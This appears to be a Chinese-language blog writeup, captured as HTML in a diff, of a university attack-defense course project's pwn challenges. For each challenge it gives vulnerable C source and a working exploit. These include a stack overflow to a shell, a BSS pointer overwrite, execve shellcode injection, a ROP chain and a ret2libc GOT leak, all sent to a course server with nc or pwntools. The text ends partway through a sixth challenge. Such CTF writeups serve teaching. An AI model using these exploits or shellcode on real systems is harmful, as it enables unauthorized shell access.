@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>攻防Project1 Writeup | Kaibro&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">-->
+  <meta name="description" content="第一題：BOF easy [ pwn ]題目123456789101112131415#include &amp;lt;stdio.h&amp;gt;void l33t() &amp;#123;    puts(&quot;Congrat !!Congrat&quot;);    system(&quot;/bin/sh&quot;);&amp;#125;int main() &amp;#123;    char buf[20];    puts(&quot;Buffer overer">
+<meta name="keywords" content="CTF,Pwn,筆記,NCU">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防Project1 Writeup">
+<meta property="og:url" content="http://blog.kaibro.tw/2016/01/16/project1/index.html">
+<meta property="og:site_name" content="Kaibro&#39;s blog">
+<meta property="og:description" content="第一題：BOF easy [ pwn ]題目123456789101112131415#include &amp;lt;stdio.h&amp;gt;void l33t() &amp;#123;    puts(&quot;Congrat !!Congrat&quot;);    system(&quot;/bin/sh&quot;);&amp;#125;int main() &amp;#123;    char buf[20];    puts(&quot;Buffer overer">
+<meta property="og:updated_time" content="2017-10-21T16:18:15.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="攻防Project1 Writeup">
+<meta name="twitter:description" content="第一題：BOF easy [ pwn ]題目123456789101112131415#include &amp;lt;stdio.h&amp;gt;void l33t() &amp;#123;    puts(&quot;Congrat !!Congrat&quot;);    system(&quot;/bin/sh&quot;);&amp;#125;int main() &amp;#123;    char buf[20];    puts(&quot;Buffer overer">
+  
+    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="/img/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>Menu</li>
+						<li>標籤</li>
+						
+						
+						<li>關於</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主頁</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+					        
+								<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18.57px;">CTF</a> <a href="/tags/DEFCON/" style="font-size: 12.86px;">DEFCON</a> <a href="/tags/Java/" style="font-size: 12.86px;">Java</a> <a href="/tags/Linux/" style="font-size: 11.43px;">Linux</a> <a href="/tags/NCU/" style="font-size: 14.29px;">NCU</a> <a href="/tags/NTU/" style="font-size: 11.43px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 15.71px;">Pwn</a> <a href="/tags/Web/" style="font-size: 17.14px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">Web security菜雞</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img src="/img/head.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">KaiBro</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主頁</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+			        
+						<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-project1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/01/16/project1/" class="article-date">
+  	<time datetime="2016-01-16T15:10:19.000Z" itemprop="datePublished">2016-01-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      攻防Project1 Writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="tags/CTF/" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/Pwn/" class="js-tag article-tag-list-link color4">Pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/筆記/" class="js-tag article-tag-list-link color3">筆記</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/NCU/" class="js-tag article-tag-list-link color4">NCU</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D"><a href="#u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D" class="headerlink" title="第一題：BOF easy [ pwn ]"></a>第一題：BOF easy [ pwn ]</h2><h3 id="u984C_u76EE"><a href="#u984C_u76EE" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">l33t</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Congrat !!Congrat"</span>);</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Buffer overerflow is easy"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Read your input :"</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">    read(fflush0,buf,<span class="number">100</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="u89E3_u984C_u601D_u8DEF"><a href="#u89E3_u984C_u601D_u8DEF" class="headerlink" title="解題思路"></a>解題思路</h3><p>l33t()中有system(“/bin/sh”)，所以目標就是執行l33t()<br>由code可知buf長度20，但read()讀100個bytes，代表這裡可以buffer overflow<br>並且這題沒有ASLR，所以用objdump可以找出l33t()的address為0x80484fd<br>接著，只需要將main()的return address蓋成0x80484fd即可<br>payload:<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(perl -e &apos;print &quot;A&quot;x32, &quot;\xfd\x84\x04\x08&quot;&apos;;cat) | nc 140.115.53.13 11001</div></pre></td></tr></table></figure></p>
+<h2 id="u7B2C_u4E8C_u984C_uFF1ABSS_overflow__5Bpwn_5D"><a href="#u7B2C_u4E8C_u984C_uFF1ABSS_overflow__5Bpwn_5D" class="headerlink" title="第二題：BSS overflow [pwn]"></a>第二題：BSS overflow [pwn]</h2><h3 id="u984C_u76EE-1"><a href="#u984C_u76EE-1" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> name[<span class="number">200</span>];</div><div class="line"><span class="keyword">char</span> *filename;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	FILE *fp ;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">2704</span>];</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"What's your name ?"</span>);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	filename = <span class="string">"/home/bssof/welcome"</span>;</div><div class="line">	gets(name);</div><div class="line">	fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">	<span class="keyword">if</span>(!fp)&#123;</div><div class="line">		<span class="built_in">puts</span>(<span class="string">"Error !!"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		fread(buf,<span class="number">2704</span>,<span class="number">1</span>,fp);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Goodbye ~ %s\n"</span>,name);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="u89E3_u984C_u601D_u8DEF-1"><a href="#u89E3_u984C_u601D_u8DEF-1" class="headerlink" title="解題思路"></a>解題思路</h3><p>這題因為使用gets()，明顯地，name可以buffer overflow<br>而name和filename都在BSS段，我們可以知道name往下蓋會蓋到filename<br>所以這題如果先把flag的位置寫到name中，再往下把filename蓋成指向name的位置<br>這樣fopen就會幫我們把flag的內容讀出來!</p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;/home/bssof/flag&quot;,&quot;\x00&quot;x184,&quot;\x60\xa0\x04\x08&quot;&apos; | nc 140.115.53.13 11000</div></pre></td></tr></table></figure></p>
+<h2 id="u7B2C_u4E09_u984C_uFF1AShellcode_Injection__5Bpwn_5D"><a href="#u7B2C_u4E09_u984C_uFF1AShellcode_Injection__5Bpwn_5D" class="headerlink" title="第三題：Shellcode Injection [pwn]"></a>第三題：Shellcode Injection [pwn]</h2><h3 id="u984C_u76EE-2"><a href="#u984C_u76EE-2" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The buffer of your input %p\n"</span>,buf);</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"Can you pwn it ?"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Your input : "</span>);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	gets(buf);</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"Goodbye ~"</span>);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="u89E3_u984C_u601D_u8DEF-2"><a href="#u89E3_u984C_u601D_u8DEF-2" class="headerlink" title="解題思路"></a>解題思路</h3><p>這題一樣gets()會導致buffer overflow發生<br>然後這題沒有DEP保護，所以可以寫shellcode進buf來執行<br>但是這題有ASLR，所以code開頭很好心的把buf位置印出來</p>
+<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">11002</span>)</div><div class="line">r.recvuntil(<span class="string">'The buffer of your input '</span>)</div><div class="line">addr = r.recvline() <span class="comment"># get the address of buffer</span></div><div class="line"><span class="keyword">print</span> addr</div><div class="line"><span class="comment"># execv('bin/sh') 25 bytes</span></div><div class="line">r.send(<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e \x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span> + <span class="string">"A"</span>*<span class="number">87</span> + p32(int(addr,<span class="number">16</span>)) + <span class="string">"\n"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="u7B2C_u56DB_u984C_uFF1AROP_beginner__5Bpwn_5D"><a href="#u7B2C_u56DB_u984C_uFF1AROP_beginner__5Bpwn_5D" class="headerlink" title="第四題：ROP beginner [pwn]"></a>第四題：ROP beginner [pwn]</h2><h3 id="u984C_u76EE-3"><a href="#u984C_u76EE-3" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">20</span>];</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"ROP is easy is'nt it ?"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Your input :"</span>);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	read(<span class="number">0</span>,buf,<span class="number">300</span>);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="u89E3_u984C_u601D_u8DEF-3"><a href="#u89E3_u984C_u601D_u8DEF-3" class="headerlink" title="解題思路"></a>解題思路</h3><p>看這題code那麼短，加上題目提到ROP，所以猜測這題執行檔是用靜態編譯<br>應該有夠多ROP gadget可以組shell<br>直接拿ROPgadget組ROP chain<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary rop_beginner --ropchain</div></pre></td></tr></table></figure></p>
+<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/envpython2</span></div><div class="line"><span class="comment">#execve generated by ROPgadget</span></div><div class="line"><span class="comment">#ROPgadget --binary rop_beginner --ropchain</span></div><div class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</div><div class="line"><span class="comment">#Padding goes here</span></div><div class="line">p=<span class="string">''</span></div><div class="line">p+=<span class="string">'a'</span>*<span class="number">32</span></div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea060</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080bae06</span>)</div><div class="line">p+=<span class="string">'/bin'</span></div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0809a15d</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea064</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080bae06</span>)</div><div class="line">p+=<span class="string">'//sh'</span></div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0809a15d</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea068</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x08054250</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0809a15d</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080481c9</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea060</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e851</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea068</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea060</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea068</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x08054250</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</div><div class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080493e1</span>)</div><div class="line"><span class="keyword">print</span> p</div></pre></td></tr></table></figure></p>
+<h2 id="u7B2C_u4E94_u984C_3AReturn_to_library__5Bpwn_5D"><a href="#u7B2C_u4E94_u984C_3AReturn_to_library__5Bpwn_5D" class="headerlink" title="第五題:Return to library [pwn]"></a>第五題:Return to library [pwn]</h2><h3 id="u984C_u76EE-4"><a href="#u984C_u76EE-4" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">See_something</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> addr)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> *address ;</div><div class="line">	address = (<span class="keyword">int</span> *)addr ;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The content of the address : %p\n"</span>,*address);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_message</span><span class="params">(<span class="keyword">char</span> *mesg)</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">48</span>];</div><div class="line">	<span class="built_in">strcpy</span>(buf,mesg);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Your message is : %s"</span>,buf);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> address[<span class="number">10</span>] ;</div><div class="line">	<span class="keyword">char</span> message[<span class="number">256</span>];</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addr ;</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"###############################"</span>);</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"Do you know return to library ?"</span>);</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"###############################"</span>);</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"What do you want to see in memory?"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Give me an address (in dec) :"</span>);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	read(<span class="number">0</span>,address,<span class="number">10</span>);</div><div class="line">	addr = strtol(address);</div><div class="line">	See_something(addr) ;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Leave some message for me :"</span>);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	read(<span class="number">0</span>,message,<span class="number">256</span>);</div><div class="line">	Print_message(message);</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"Thanks you ~"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="u89E3_u984C_u601D_u8DEF-4"><a href="#u89E3_u984C_u601D_u8DEF-4" class="headerlink" title="解題思路"></a>解題思路</h3><p>這題有DEP保護<br>一開始先找出puts的got位址，因為程式一開始可以讓我們讀某個 address的內容，我們就塞這個got給他，讓他讀puts真正位址<br>根據 base + offset = address，我們把得到的位址減掉offset就能找出 base address，再⽤base + system offset就能得到system的位址 如此一來就能控制return address跳到system，並且system的參數(/bin/sh)位址也能從libc.so取得(⼀樣是offset + base)</p>
+<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">puts_got = <span class="number">0x804a01c</span></div><div class="line">puts_off = <span class="number">0x64c10</span></div><div class="line">gets_off = <span class="number">0x642b0</span></div><div class="line">system_off = <span class="number">0x3fcd0</span></div><div class="line">sh_off = <span class="number">0x15da84</span></div><div class="line">r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">11004</span>)</div><div class="line">r.send(<span class="string">"134520860"</span> + <span class="string">"\n"</span>)</div><div class="line">r.recvuntil(<span class="string">'The content of the address : '</span>)</div><div class="line">puts_addr = r.recvline()</div><div class="line">base = int(puts_addr,<span class="number">16</span>) - puts_off</div><div class="line">gets_addr = base + gets_off</div><div class="line">system_addr = base + system_off</div><div class="line">r.send(<span class="string">"A"</span>*<span class="number">60</span> + p32(system_addr) + <span class="string">"A"</span>*<span class="number">4</span> + p32(sh_off + base) + <span class="string">"\n"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="u7B2C_u516D_u984C_uFF1ASimple_echo__5Bpwn_5D"><a href="#u7B2C_u516D_u984C_uFF1ASimple_echo__5Bpwn_5D" class="headerlink" title="第六題：Simple echo [pwn]"></a>第六題：Simple echo [pwn]</h2><h3 id="u984C_u76EE-5"><a href="#u984C_u76EE-5" class="headerlink" title="題目"></a>題目</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">	char buf[128];</div><div class="line">	setvbuf(stdout,0,2,0);</div><div class="line">	puts("####################");</div><div class="line">	puts(" Simple echo server");</div><div class="line">	puts("####################");</div><div class="line">	puts("Enter exit to quit ");</div><div class="line">	while(1)&#123;</div><div class="line">		memset(buf,0,128);</div><div class="line">		printf("Input : ");</div><div class="line">		read(0,buf,256);</div><div class="line">		buf[136] = '\x00';</div><div class="line">		usleep(400000);</div><div class="line">		if(!memcmp(buf,"exit",4))&#123;</div><div class="line">			break ;</div><div class="line">		&#125;</div><div class="line">		puts("");</div><div class="line">		printf("echo %s",buf);</div><div class="line">	&#125;</div><div class="line">	puts("goodbye~");</div><div class="line">&#125;</div></pre></td></tr></table></figure>
